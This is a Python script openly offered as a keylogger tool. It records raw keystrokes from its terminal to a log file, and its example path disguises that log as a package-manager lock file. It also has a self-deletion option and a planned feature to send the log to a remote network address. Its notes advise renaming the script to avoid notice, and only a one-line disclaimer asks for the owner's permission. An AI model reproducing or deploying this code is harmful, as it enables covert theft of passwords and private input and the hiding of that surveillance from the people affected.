#!/usr/bin/env python3
#======================================================================
# Brought to you by ~ r3dg0bl1n <(¬‿¬)>
# -------------------------------- R3 ---------------------------------
# r3-pkg/keylogger [r3801]
# v/0.2-alpha
# --------------------------- INSTRUCTIONS ----------------------------
# Usage: python3 r3_keylogger.py [-o FILE_PATH] [-oN NETWORK_PATH] [-v] [-d] [-K]
# -o : Defines the output file.
# -oN : Defines the output file in a different network location.
# -v : Prints output on shell.
# -d : Allows to terminate process pressing "º" key.
# -K : Destroys script when terminated. ONLY USE IN COPY OR COMPILED.
# (?) : To stop execution create the empty file "/tmp/r3ctrl".
# (X) : python3 snake.py -o /var/tmp/yum.lock -oN 10.4.19.203:9001/history.log -v
# ------------------------------ NOTES --------------------------------
# For god's sake, change the script name if you are gonna use it.
# -K parameter doesn't work with debug termination.
# ---------------------------- DISCLAIMER -----------------------------
# Use only with explicit permission of the system owner.
# Breaking things or getting arrested is on you, I'm just a goblin.
# ----------------------------- LICENSE -------------------------------
# Licensed under the MIT License (see LICENSE file in repo).
#======================================================================

#============================ ALPHA TABLE =============================
#------------------------------- bugs ---------------------------------
# [ ]
#----------------------------- features -------------------------------
# [ ] Compatible on Windows.
# [X] Run on background quietly.
# [ ] Implement -oN parameter
# [X] Implement -K parameter
#======================================================================
#----------------------------------------------------------------------
#\ PRE

import sys, os, os.path as P, time, threading as th;
sys.path.insert(0, P.abspath(P.join(P.dirname(__file__), "../../lib")));
from r3 import Core, ERR, goblint;

def _pre(argv) -> Core:
    c = Core("r3801", argv, { 
        "-o%": False,
        "-oN%": False,
        "-v": False,
        "-d": False,
        "-K": False,
    }, True)
    c.set_err({
        1: "Could not open output file",
        2: "Could not establish connection with network output file",
    });
    return c;

if __name__ == "__main__":
    _core = _pre(sys.argv);
    _core.load(); # EXIT
    _stp = th.Event();

#/ PRE
#----------------------------------------------------------------------
#\ H - Essentials

if __name__ == "__main__":
    if os.name == "nt":
        import msvcrt, subprocess as proc;
        def getch():
            return msvcrt.getch();

        def destroy():
            if _core.arg("K"):
                sp = os.path.abspath(sys.argv[0]);
                proc.Popen(["cmd", "/c", "del", "/f", "/q", sp], shell=True);
    else:
        import tty, termios as tm, subprocess as proc;
        def getch():
            fd = sys.stdin.fileno();
            ost = tm.tcgetattr(fd);
            try:
                tty.setraw(fd);
                ch = sys.stdin.read(1);
            finally: tm.tcsetattr(fd, tm.TCSADRAIN, ost);
            return ch;

        def destroy():
            if _core.arg("K"):
                sp = os.path.abspath(sys.argv[0]);
                proc.Popen(f"sh -c 'sleep 1; rm -f \"{sp}\"' &", shell=True);

#/ H - Essentials
#----------------------------------------------------------------------
#\ SRC - Functions

if __name__ == "__main__":
    def reg():
        if _core.arg("o"): of.write("=============== NEW SESSION ===============\n");
        try:
            while not _stp.is_set():
                k = getch();
                if k in ("\r", "\r\n"):
                    if _core.arg("o"): of.write("\n");
                    if _core.arg("v"): goblint("");
                elif _core.arg("d") and k == "\u00BA":
                    _stp.set();
                else:
                    if _core.arg("o"): of.write(k);
                    if _core.arg("v"): goblint(k, end="", flush=True);
                if _core.arg("o"): of.flush();
        finally:
            if os.path.isfile("/tmp/r3ctrl"): os.remove("/tmp/r3ctrl");
            if _core.arg("o"):
                of.write("\n");
                of.close();
            if _core.arg("K"):
                destroy();
            _core.stop(ERR.NO_ERROR); # EXIT

    def ctrl():
        while True:
            if os.path.isfile("/tmp/r3ctrl"):
                _stp.set(); # EXIT
                break;
            time.sleep(1);

#/ SRC - Functions
#----------------------------------------------------------------------
#\ SRC - MAIN

if __name__ == "__main__":
    if os.path.isfile("/tmp/r3ctrl"): os.remove("/tmp/r3ctrl");

    if _core.arg("o"):
        of = None;
        try: of = open(f"{_core.arg("o")}", "a");
        except IOError as e: _core.stop(ERR.C(1)); # EXIT

    th.Thread(target=ctrl, daemon=True).start();
    reg();

#/ SRC - MAIN
#----------------------------------------------------------------------

# =====================================================================
# Soy español, ¿a qué quieres que te gane?